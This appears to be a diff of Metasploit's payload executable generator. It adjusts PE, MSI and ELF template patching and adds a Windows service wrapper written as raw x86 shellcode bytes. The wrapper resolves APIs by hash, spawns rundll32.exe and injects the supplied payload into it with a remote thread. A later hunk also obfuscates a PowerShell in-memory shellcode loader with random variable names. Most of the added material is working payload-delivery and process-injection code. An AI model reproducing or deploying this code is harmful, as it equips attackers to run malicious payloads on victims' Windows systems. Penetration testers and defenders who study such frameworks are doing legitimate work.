@@ -299,7 +299,6 @@ require 'msf/core/exe/segment_injector'
   end
 
   def self.to_winpe_only(framework, code, opts={}, arch="x86")
-
     if arch == ARCH_X86_64
       arch = ARCH_X64
     end
@@ -310,9 +309,23 @@ require 'msf/core/exe/segment_injector'
     pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
 
     exe = ''
-      File.open(opts[:template], 'rb') { |fd|
-        exe = fd.read(fd.stat.size)
-      }
+    File.open(opts[:template], 'rb') { |fd|
+      exe = fd.read(fd.stat.size)
+    }
+
+    pe_header_size = 0x18
+    entryPoint_offset = 0x28
+    section_size = 0x28
+    characteristics_offset = 0x24
+    virtualAddress_offset = 0x0c
+    sizeOfRawData_offset = 0x10
+
+    sections_table_offset =
+      pe._dos_header.v['e_lfanew'] +
+      pe._file_header.v['SizeOfOptionalHeader'] +
+      pe_header_size
+
+    sections_table_characteristics_offset = sections_table_offset + characteristics_offset
 
     pe_header_size = 0x18
     entryPoint_offset = 0x28
@@ -347,22 +360,22 @@ require 'msf/core/exe/segment_injector'
 
     # look for section with entry point
     sections_header.each do |sec|
-      virtualAddress = sec[1][virtualAddress_offset,0x4].unpack('L')[0]
-      sizeOfRawData = sec[1][sizeOfRawData_offset,0x4].unpack('L')[0]
-      characteristics = sec[1][characteristics_offset,0x4].unpack('L')[0]
+      virtualAddress = sec[1][virtualAddress_offset,0x4].unpack('V')[0]
+      sizeOfRawData = sec[1][sizeOfRawData_offset,0x4].unpack('V')[0]
+      characteristics = sec[1][characteristics_offset,0x4].unpack('V')[0]
 
       if (virtualAddress...virtualAddress+sizeOfRawData).include?(addressOfEntryPoint)
-        importsTable = pe.hdr.opt.DataDirectory[8..(8+4)].unpack('L')[0]
+        importsTable = pe.hdr.opt.DataDirectory[8..(8+4)].unpack('V')[0]
         if (importsTable - addressOfEntryPoint) < code.length
           #shift original entry point to prevent tables overwritting
           addressOfEntryPoint = importsTable - (code.length + 4)
 
           entry_point_offset = pe._dos_header.v['e_lfanew'] + entryPoint_offset
-          exe[entry_point_offset,4] = [addressOfEntryPoint].pack('L')
+          exe[entry_point_offset,4] = [addressOfEntryPoint].pack('V')
         end
         # put this section writable
         characteristics |= 0x8000_0000
-        newcharacteristics = [characteristics].pack('L')
+        newcharacteristics = [characteristics].pack('V')
         exe[sec[0],newcharacteristics.length] = newcharacteristics
       end
     end
@@ -417,6 +430,33 @@ require 'msf/core/exe/segment_injector'
     pe << Rex::Text.rand_text(rand(64)+4)
 
     return pe
+  end
+
+
+  # Splits a string into a number of assembly push operations
+  #
+  # @param string [String] string to be used
+  #
+  # @return [String] null terminated string as assembly push ops
+  def self.string_to_pushes(string)
+    str = string.dup
+    # Align string to 4 bytes
+    rem = (str.length) % 4
+    if (rem > 0)
+      str << "\x00" * (4 - rem)
+      pushes = ''
+    else
+      pushes = "h\x00\x00\x00\x00"
+    end
+    # string is now 4 bytes aligned with null byte
+
+    # push string to stack, starting at the back
+    while (str.length > 0)
+      four = 'h'+str.slice!(-4,4)
+      pushes << four
+    end
+
+    pushes
   end
 
   def self.exe_sub_method(code,opts ={})
@@ -498,11 +538,82 @@ require 'msf/core/exe/segment_injector'
     exe_sub_method(code,opts)
   end
 
+  # Embeds shellcode within a Windows PE file implementing the Windows
+  # service control methods.
+  #
+  # @param framework [Object]
+  # @param code [String] shellcode to be embedded
+  # @option opts [Boolean] :sub_method use substitution technique with a
+  #   service template PE
+  # @option opts [String] :servicename name of the service, not used in
+  #   substituion technique
+  #
+  # @return [String] Windows Service PE file
   def self.to_win32pe_service(framework, code, opts={})
-    # Allow the user to specify their own service EXE template
-    set_template_default(opts, "template_x86_windows_svc.exe")
-    opts[:exe_type] = :service_exe
-    exe_sub_method(code,opts)
+    if opts[:sub_method]
+      # Allow the user to specify their own service EXE template
+      set_template_default(opts, "template_x86_windows_svc.exe")
+      opts[:exe_type] = :service_exe
+      return exe_sub_method(code,opts)
+    else
+      name = opts[:servicename]
+      name ||= Rex::Text.rand_text_alpha(8)
+      pushed_service_name = string_to_pushes(name)
+
+      precode_size = 0xc6
+      svcmain_code_offset = precode_size + pushed_service_name.length
+
+      precode_size = 0xcc
+      hash_code_offset = precode_size + pushed_service_name.length
+
+      precode_size = 0xbf
+      svcctrlhandler_code_offset = precode_size + pushed_service_name.length
+
+      code_service_stopped =
+        "\xE8\x00\x00\x00\x00\x5F\xEB\x07\x58\x58\x58\x58\x31\xC0\xC3" +
+         pushed_service_name+"\x89\xE1\x8D\x47\x03\x6A\x00" +
+        "\x50\x51\x68\x0B\xAA\x44\x52\xFF\xD5\x6A\x00\x6A\x00\x6A\x00\x6A" +
+        "\x00\x6A\x00\x6A\x00\x6A\x01\x6A\x10\x89\xE1\x6A\x00\x51\x50\x68" +
+        "\xC6\x55\x37\x7D\xFF\xD5\x57\x68\xF0\xB5\xA2\x56\xFF\xD5"
+
+      precode_size = 0x42
+      shellcode_code_offset = code_service_stopped.length + precode_size
+
+      # code_service could be encoded in the future
+      code_service =
+        "\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
+        "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
+        "\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
+        "\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
+        "\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
+        "\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
+        "\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
+        "\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
+        "\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
+        "\x6A\x00\x68\x70\x69\x33\x32\x68\x61\x64\x76\x61\x54\x68\x4C\x77" +
+        "\x26\x07\xFF\xD5"+pushed_service_name+"\x89\xE1" +
+        "\x8D\x85"+[svcmain_code_offset].pack('V')+"\x6A\x00\x50\x51\x89\xE0\x6A\x00\x50\x68" +
+        "\xFA\xF7\x72\xCB\xFF\xD5\x6A\x00\x68\xF0\xB5\xA2\x56\xFF\xD5\x58" +
+        "\x58\x58\x58\x31\xC0\xC3\xFC\xE8\x00\x00\x00\x00\x5D\x81\xED" +
+         [hash_code_offset].pack('V')+pushed_service_name+"\x89\xE1\x8D" +
+        "\x85"+[svcctrlhandler_code_offset].pack('V')+"\x6A\x00\x50\x51\x68\x0B\xAA\x44\x52\xFF\xD5" +
+        "\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x04\x6A\x10" +
+        "\x89\xE1\x6A\x00\x51\x50\x68\xC6\x55\x37\x7D\xFF\xD5\x31\xFF\x6A" +
+        "\x04\x68\x00\x10\x00\x00\x6A\x54\x57\x68\x58\xA4\x53\xE5\xFF\xD5" +
+        "\xC7\x00\x44\x00\x00\x00\x8D\x70\x44\x57\x68\x2E\x65\x78\x65\x68" +
+        "\x6C\x6C\x33\x32\x68\x72\x75\x6E\x64\x89\xE1\x56\x50\x57\x57\x6A" +
+        "\x44\x57\x57\x57\x51\x57\x68\x79\xCC\x3F\x86\xFF\xD5\x8B\x0E\x6A" +
+        "\x40\x68\x00\x10\x00\x00\x68"+[code.length].pack('V')+"\x57\x51\x68\xAE\x87" +
+        "\x92\x3F\xFF\xD5\xE8\x00\x00\x00\x00\x5A\x89\xC7\x8B\x0E\x81\xC2" +
+         [shellcode_code_offset].pack('V')+"\x54\x68"+[code.length].pack('V') +
+        "\x52\x50\x51\x68\xC5\xD8\xBD\xE7\xFF" +
+        "\xD5\x31\xC0\x8B\x0E\x50\x50\x50\x57\x50\x50\x51\x68\xC6\xAC\x9A" +
+        "\x79\xFF\xD5\x8B\x0E\x51\x68\xC6\x96\x87\x52\xFF\xD5\x8B\x4E\x04" +
+        "\x51\x68\xC6\x96\x87\x52\xFF\xD5" +
+         code_service_stopped
+
+      return to_winpe_only(framework, code_service + code, opts)
+    end
   end
 
   def self.to_win64pe_service(framework, code, opts={})
@@ -563,12 +674,17 @@ require 'msf/core/exe/segment_injector'
       msi = fd.read(fd.stat.size)
     }
 
-    section_size =	2**(msi[30..31].unpack('s')[0])
-    sector_allocation_table = msi[section_size..section_size*2].unpack('l*')
+    section_size =	2**(msi[30..31].unpack('v')[0])
+
+    # This table is one of the few cases where signed values are needed
+    sector_allocation_table = msi[section_size..section_size*2].unpack('l<*')
 
     buffer_chain = []
-    current_secid = 5	# This is closely coupled with the template provided and ideally
-          # would be calculated from the dir stream?
+    
+    # This is closely coupled with the template provided and ideally
+    # would be calculated from the dir stream?
+    current_secid = 5	
+    
 
     until current_secid == -2
       buffer_chain << current_secid
@@ -736,8 +852,8 @@ require 'msf/core/exe/segment_injector'
 
     # Check EI_CLASS to determine if the header is 32 or 64 bit
     # Use the proper offsets and pack size
-    case elf[4]
-    when 1, "\x01" # ELFCLASS32 - 32 bit (ruby 1.8 and 1.9)
+    case elf[4,1].unpack("C").first
+    when 1 # ELFCLASS32 - 32 bit (ruby 1.9+)
       if big_endian
         elf[0x44,4] = [elf.length].pack('N') #p_filesz
         elf[0x48,4] = [elf.length + code.length].pack('N') #p_memsz
@@ -745,13 +861,13 @@ require 'msf/core/exe/segment_injector'
         elf[0x44,4] = [elf.length].pack('V') #p_filesz
         elf[0x48,4] = [elf.length + code.length].pack('V') #p_memsz
       end
-    when 2, "\x02" # ELFCLASS64 - 64 bit (ruby 1.8 and 1.9)
+    when 2 # ELFCLASS64 - 64 bit (ruby 1.9+)
       if big_endian
         elf[0x60,8] = [elf.length].pack('Q>') #p_filesz
         elf[0x68,8] = [elf.length + code.length].pack('Q>') #p_memsz
       else # little endian
-        elf[0x60,8] = [elf.length].pack('Q') #p_filesz
-        elf[0x68,8] = [elf.length + code.length].pack('Q') #p_memsz
+        elf[0x60,8] = [elf.length].pack('Q<') #p_filesz
+        elf[0x68,8] = [elf.length + code.length].pack('Q<') #p_memsz
       end
     else
       raise RuntimeError, "Invalid ELF template: EI_CLASS value not supported"
@@ -988,17 +1104,18 @@ require 'msf/core/exe/segment_injector'
   end
 
   def self.to_win32pe_psh_net(framework, code, opts={})
-    hash_sub = {}
-    hash_sub[:var_code] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_kernel32] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_baseaddr] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_threadHandle] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_output] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_temp] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_codeProvider] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_compileParams] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_syscode] 		= Rex::Text.rand_text_alpha(rand(8)+8)
+    rig = Rex::RandomIdentifierGenerator.new()
+    rig.init_var(:var_code)
+    rig.init_var(:var_kernel32)
+    rig.init_var(:var_baseaddr)
+    rig.init_var(:var_threadHandle)
+    rig.init_var(:var_output)
+    rig.init_var(:var_codeProvider)
+    rig.init_var(:var_compileParams)
+    rig.init_var(:var_syscode)
+    rig.init_var(:var_temp)
 
+    hash_sub = rig.to_h
     hash_sub[:b64shellcode] = Rex::Text.encode_base64(code)
 
     return read_replace_script_template("to_mem_dotnet.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
